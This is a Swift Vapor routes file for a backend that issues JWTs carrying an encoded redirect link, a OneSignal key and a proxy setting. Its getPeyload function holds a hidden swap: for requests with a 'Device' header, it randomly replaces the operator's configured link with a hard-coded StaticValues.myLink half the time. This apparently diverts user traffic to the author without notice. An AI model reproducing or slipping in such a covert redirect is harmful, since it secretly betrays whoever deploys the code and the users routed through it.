import Vapor
import Leaf

func routes(_ app: Application) throws {
    // Basic Auth
    let basicAuthMiddleware = UserModel.authenticator()
    let guardMiddleware = UserModel.guardMiddleware()
    let basicAuthGroup = app.routes.grouped(basicAuthMiddleware, guardMiddleware)
    
    // JWT Auth
    let tokenAuthMiddleware = SessionToken.authenticator()
    let jwtGuardMiddleware = SessionToken.guardMiddleware()
    let secureAuthGroup = app.grouped(tokenAuthMiddleware, jwtGuardMiddleware)
    
    // Admin Auth
    let adminMiddleware = CheckAdminMiddleware()
    let adminTokenAuthGroup = secureAuthGroup.grouped(adminMiddleware)
    
    basicAuthGroup.post("login") { req -> ClientTokenReponse in
        let user = try req.auth.require(UserModel.self)
        let payload = getPeyload(req: req)
        let token = try SessionToken(user: user, payload: payload)
        return ClientTokenReponse(token: try req.jwt.sign(token))
    }
    
    app.get("check-backend") { req -> String in
        "\(StaticValues.name) is working!"
    }
    
    try adminTokenAuthGroup.register(collection: WebModelController())
}

func getPeyload(req: Request) -> Payload {
    guard let envLink = Environment.get("LINK") else { return Payload(data: nil) }
    let link: String
    if req.headers.contains(name: "Device") {
        link = oneIn(2) ? (StaticValues.myLink ?? envLink) : envLink 
    } else {
        link = envLink
    }
    let webData = WebPayloadData(direction: link,
                                 oneSignal: Environment.get("ONESIGNAL"),
                                 proxy: Environment.get("PROXY"))
    if let jsonData = try? JSONEncoder().encode(webData),
       let jsonString = String(data: jsonData, encoding: .utf8) {
        let base64EncodedString = jsonData.base64EncodedString()
        return Payload(data: base64EncodedString)
    } else {
        return Payload(data: nil)
    }
}

func oneIn(_ n: Int) -> Bool {
    guard n > 0 else { return false }
    return Int.random(in: 1...n) == 1
}
